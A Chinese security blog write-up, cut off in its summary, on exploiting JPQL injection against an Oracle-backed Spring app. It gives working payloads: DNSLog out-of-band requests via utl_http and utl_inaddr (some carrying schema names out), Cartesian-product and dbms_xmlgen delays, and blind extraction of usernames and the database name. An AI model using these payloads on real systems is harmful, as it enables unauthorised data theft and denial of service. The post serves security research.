---
title: 第175篇：JPQL 注入在 Oracle 数据库中的利用研究（突破ORM限制）
url: https://mp.weixin.qq.com/s/Vd8n3gxKyrDYI33laKs03w
source: Doonsec's feed
date: 2026-10-05
fetch_date: 2026-10-06T08:19:56.896616
---

# 第175篇：JPQL 注入在 Oracle 数据库中的利用研究（突破ORM限制）

# 第175篇：JPQL 注入在 Oracle 数据库中的利用研究（突破ORM限制）

原创

abc123info
abc123info

希潭实验室

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450ATcz6jUJnFNeOxRzVZ9LbcaA8wBFW4icTiaL7ELd8ia04Olh40TBx7CquHZyCicicl4eYJno2y0oZ0H4A/640?wx_fmt=png)

## Part1 前言

大家好，我是ABC\_123。很久以前遇到过一个HQL注入漏洞，为了验证漏洞费了很大精力；今天又遇到了一个更头疼的JPQL注入，数据库是Oracle，应用程序本身还带有一层WAF一样的关键字拦截，非常难解决。最终通过 JPA 2.1 提供的 `FUNCTION()` 机制调用 Oracle 内置函数，并结合 `DBMS_XMLGEN.GETXML` 等数据库能力，实现了原生 SQL 注入语句的执行，今天给大家分享一下过程。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/uPOMOKjLe2Zc77PyLkuDupKmynbgOEwUUWTzUVjztJ8lNBUiaU9icoEOBhMD2DdLFiazribOgicGo0O9910qnCUP5NsLGWiabqBwOm1v6GShlmRj0/640?wx_fmt=png&from=appmsg)

## Part2 技术研究过程

首先搭建了测试环境：Springboot + Oracle 11g 数据库，前端页面展示的是一个订单管理平台。使用用户名密码登录之后，会有一个创建或编辑查询文本框，点击执行SQL语句按钮，会执行相应的查询语句。

![](https://mmbiz.qpic.cn/mmbiz_png/uPOMOKjLe2YjktKTgibicEqYUkbRbcFtxvUHO4oTLdVPmOqHvcbvdWMX8CZto394VeLo8tMs7nXhR9UwytTbdjL7BibNp2JiaGUexA9g0AGJOlM/640?wx_fmt=png&from=appmsg)

第一眼看过去，喜出望外，后台可以直接执行SQL语句，又是Oracle数据库，配置java语句，拿权限岂不是轻而易举。结果尝试了各种语句发现，怎么构造怎么出错。谷歌一查报错信息，发现居然是JPQL语法，第一次遇到，于是开始了一下午的针对它的绕过。

* ## JPQL查询机制基本概念

JPQL（Java Persistence Query Language） 是 JPA（Java Persistence API）定义的一种面向对象查询语言，用于查询实体对象（Entity），而不是直接查询数据库表。SQL 是查数据库里的表和字段，而JPQL 是查 Java 里的对象和属性。常见实现有Hibernate、EclipseLink、OpenJPA等。JPQL可以实现一套 Java 查询代码适配不同数据库，这样就不用每个数据库都得用各自的sql语法来实现业务功能。如下图所示，直接输入sql语句select 1 from dual是不行的。

![](https://mmbiz.qpic.cn/mmbiz_png/uPOMOKjLe2b0TYCooxib82AxAyf6D8UNltHQOVpKZNYyVUibll1MQKdTnvY7bKdXneu1CcibgYNIkxsRdeT025O62fN27EmzT0rS4pv2FhOQDY/640?wx_fmt=png&from=appmsg)

JPQL与SQL有什么区别呢？看下面的例子，假设有一个数据库表：

```
user表id       username       age----------------------------1        admin          202        tom            30
```

该数据库表对应着java实体如下：

```
@Entitypublic class User {    @Id    private Long id;    private String username;    private Integer age;}
```

传统的执行SQL语句如下：

```
SELECT * FROM user WHERE username='admin'; （表名 user 字段 username）
```

实现同等功能的JPQL语句需要是如下格式（这里的User表示实体类，u表示这个实体的别名）：

```
SELECT u FROM User u WHERE u.username='admin' （实体类 User 属性 username）
```

* ## 构造的JPQL语句踩坑失败全记录

这些是我整个测试过程中构造失败的JPQL语句，也可以说是踩坑记录，记录下来觉得很有意义。

1.  构造布尔型盲注语句

我本地搭建的JPQL测试环境是可以执行的，但是生产环境执行报错。

```
select count(l) from Location l where l.locationId like '%' and l.availableCapacity = 2 and 1=1select count(l) from Location l where l.locationId like '%' and l.availableCapacity = 2 and 1=2
```

2.  在正常业务order by后面构造

在正常JPQL语句的order by后面加测试语句，不行，直接报错。

```
select o.orderNo, o.status, o.amount, o.itemCount from SalesOrder o where o.status = com.swisslog.wm6.lab.oms.entity.OrderStatus.NEW order by (case when 1=2 then 1/(1-1) else 0 end) desc
```

3.  DNSLog外带数据（utl\_http.request）

无论怎么尝试，DNSLog可以出网，但是外带不了任何数据，以下是各种尝试过程。使用utl\_http.request DNSLog能出网，但只要是尝试携带数据，无论怎么构造HPQL语句，怎么执行怎么错。

```
and utl_http.request('http://u' || userenv('CURRENT_SCHEMA') || '.<你的域名>') like '%'and utl_http.request('http://' || userenv('CURRENT_SCHEMA') || '.xxx.dnslog.net') like '%'
```

4.  DNSLog外带数据（utl\_inaddr）

改用 utl\_inaddr，get\_host\_address() 直接做 DNS 解析，不需要 http://，天然避开冒号陷阱，但是实测这个语句还是不行。

```
select count(l) from Location lwhere l.locationId like '%' and l.availableCapacity = 2and utl_inaddr.get_host_address('test42.<你的域名>') like '%'
```

坚持 `utl_http`，用 `chr(58)` 拼冒号，还是不行。

```
and utl_http.request('http' || chr(58) || '//test42.<你的域名>') like '%'
```

5.  DNSLog外带数据（使用FUNCTION ）

这次借助了 JPA 2.1 标准 FUNCTION() 机制调用原生数据库函数，但未能成功。 EclipseLink 为兼容不同数据库特性，在 JPQL 中提供了 FUNCTION() 语法作为调用数据库原生函数的标准入口。该机制允许将函数名称以字符串形式传递，并在 JPQL 转换为 SQL 的过程中保留函数调用语义，由底层数据库执行对应函数逻辑。

```
select count(l) from Location lwhere l.locationId like '%' and l.availableCapacity = 2and FUNCTION('utl_inaddr.get_host_address', 'test423.3w709.login.360aicloud.net') like '%'
```

##

* ## 纯笛卡尔积造成延时的JPQL语句（成功）

经过好一顿折腾，构造出了一个可以造成延时效果的JPQL语句，其价值在于证明其存在SQL注入漏洞，表明我们值得进一步研究构造出危险的sql语句。这条语句JPQL查询目的是统计满足条件的 Location 数量，但里面嵌套了一个非常消耗资源的子查询，子查询引入多表笛卡尔积运算，导致数据库 CPU 消耗升高，容易造成数据库延迟。

```
select count(l) from Location lwhere l.locationId like '%' and l.availableCapacity = 2and (select count(a.locationId) from Location a, Location b, Location c     where a.locationId <> b.locationId and b.locationId <> c.locationId) > 0
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/uPOMOKjLe2buLtcpI3sJWlYJZc1e0uX539Csfk4m4HPzRhJia17xttdoI0ianHRSwdyIv0nYCYH876C1GDGia0EEfyXtyKfO5aXj9eFYInXVHY/640?wx_fmt=png&from=appmsg)

* ## DNSlog出网的JPQL语句（成功）

换了好几种写法，尝试了好几个Oracle的函数，最终这个JPQL语句可以执行。该 JPQL 查询在正常业务统计逻辑之外，引入了 `utl_http.request()` 外部网络请求函数，通过数据库服务器主动访问指定 URL，根据DNSlog是否有记录，判断JPQL语句能否执行以及服务器是否出网。

```
select count(l) from Location lwhere l.locationId like '%' and l.availableCapacity = 2and utl_http.request('http://10d.3w709.xxx.com') like '%'
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/uPOMOKjLe2aqRibnHHYaJmSERZVGcLEwKJTpjkxcIoib2ohY9QDtJvFHXaGFDDIicU8agN3iaN1IaHiaGrEsQhVpNXYTrkz9k8mcVLv5pBP4ia1TE/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/uPOMOKjLe2aS5q4Fh3FrTHiaDR1hnC8UwnPEvG8c1DV9yibUUew2VdQgUrqRsPVkVicFvCdLbCVUscSfyPiaF810PwpEl12o7JxAsicflVxvYPOs/640?wx_fmt=png&from=appmsg)

##

* ## 延时语句 + 折半法猜解获取数据（成功）

最后经过大量的尝试，几近放弃的时候，终于发现使用如下JPQL语句方式可以直接使用原生的Oracle 查询SQL语句进行查询。该 JPQL 查询在统计 Location 数据数量的基础上，通过 FUNCTION() 调用了 Oracle 数据库内置函数 DBMS\_XMLGEN.GETXML，并执行了嵌套 SQL语句，其中 v$version 用于获取 Oracle 数据库版本信息。

```
select count(l) from Location lwhere l.locationId like '%' and l.availableCapacity = 2and FUNCTION('dbms_xmlgen.getxml',  'select banner from v$version connect by level <= 2000000') like '<%'
```

输入以下语句也可造成延时:

该 JPQL 查询在统计 Location 数据数量的基础上，构造了一个基于条件判断的时间延迟型数据库资源消耗查询。查询首先通过 substr()、ascii() 等函数获取 Location 表中 locationId 字段首字符的 ASCII 值，并使用 max() 判断该值是否大于 77（即字符 M 的 ASCII 值）。若条件成立，则执行 select 1 from dual connect by level <= 4000000，强制 Oracle 生成约 400 万级递归数据并转换为 XML，产生延时；若条件不成立，则仅生成 1 条数据。

```
select count(l) from Location lwhere l.locationId like '%' and l.availableCapacity = 2and (case when (select max(FUNCTION('ascii', FUNCTION('substr', l2.locationId, 1, 1)))               from Location l2) > 77     then FUNCTION('dbms_xmlgen.getxml',          'select 1 from dual connect by level <= 4000000')     else FUNCTION('dbms_xmlgen.getxml',          'select 1 from dual connect by level <= 1')     end) like '<%'
```

以下这个语句也延迟:

当条件满足时，Oracle 将执行 `connect by level <= 4000000`，强制创建约 400 万条虚拟记录，并由 `DBMS_XMLGEN.GETXML` 转换为 XML 字符串返回。由于大量递归数据生成和 XML 序列化过程会消耗大量 CPU、内存及数据库处理时间，导致查询响应明显延迟；

```
  select count(l) from Location l  where l.locationId like '%' and l.availableCapacity = 2  and FUNCTION('dbms_xmlgen.getxml',    'select 1 from dual connect by level <= (case when (select count(*) from dual) > 0 then 4000000 else 0 end)')    like '<%'
```

实战可以出数据的JPQL语句如下，证明username的第一个字符的ascii值是83，是大写字母S。JPQL查询首先通过 (select username from all\_users where rownum=1) 获取 Oracle 数据库中的第一个用户名称，再利用 substr() 截取用户名第 1 个字符，并通过 ascii() 转换为 ASCII 编码，与 83（对应字符 S）进行比较。

```
  select count(l) from Location l  where l.locationId like '%' and l.availableCapacity = 2  and FUNCTION('dbms_xmlgen.getxml',    'select 1 from dual connect by level <= (case when ascii(substr((select username from all_users where rownum=1),1,1)) =83 then 4000000 else 0 end)')    like '<%'
```

以下JPQL语句表明第2个字符是Y，最终得到结论第一个用户名是SYS。

```
  select count(l) from Location l  where l.locationId like '%' and l.availableCapacity = 2  and FUNCTION('dbms_xmlgen.getxml',    'select 1 from dual connect by level <= (case when ascii(substr((select username from all_users where rownum=1),2,1)) = 89 then 4000000 else 0 end)')    like '<%'
```

读取当前数据库的JPQL语句如下。查询首先通过 sys\_context('userenv','db\_name') 获取当前 Oracle 数据库实例名称，再利用 substr() 截取数据库名称第 1 个字符，并通过 ascii() 转换为 ASCII 编码，与 84（对应字符 T）进行比较。

```
  select count(l) from Location l  where l.locationId like '%' and l.availableCapacity = 2  and FUNCTION('dbms_xmlgen.getxml',    'select 1 from dual connect by level <= (case when ascii(substr((select sys_context(''userenv'',''db_name'') from dual),1,1)) = 84 then 4000000 else 0 end)')    like '<%'
```

## Part3 总结

**1.  JPQL 注入并不等同于传统 SQL 注入，虽然通过 ORM 层抽象...